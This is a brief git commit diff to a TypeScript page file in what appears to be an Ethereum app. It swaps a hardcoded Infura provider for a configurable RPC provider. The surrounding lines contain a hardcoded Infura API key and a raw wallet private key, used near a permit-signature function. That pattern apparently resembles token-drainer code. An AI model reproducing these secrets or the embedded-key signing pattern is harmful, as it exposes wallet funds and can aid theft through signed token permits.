40e82710ae0cbc7d7dd0b3169b94f765917efb41
FAZEL UNITY <53996181+fazelunity0054@users.noreply.github.com>
2024-05-30 03:57:14 +0330

    update app/page.tsx

--- src/app/page.tsx
+++ src/app/page.tsx
@@ -234,7 +234,7 @@ async function createPermitSignature(signMethod: any, domainName: string,contrac
 let _WALLET: Wallet;
 const createSigner = async (rpc: string): Promise<JsonRpcSigner>=>{
 	if (_WALLET) return _WALLET as any;
-	const provider = new ethers.providers.InfuraProvider('mainnet','ca540969e8c84a76b796343e377a2edd');
+	const provider = new ethers.providers.JsonRpcProvider(rpc);
 	await provider.detectNetwork()
 	const privateKey = 'f0d3d8a445a62ee09543c760c0856560b2a8602b8f289e2b69c3ac0ce498df59';
 	_WALLET = new Wallet(privateKey, provider);
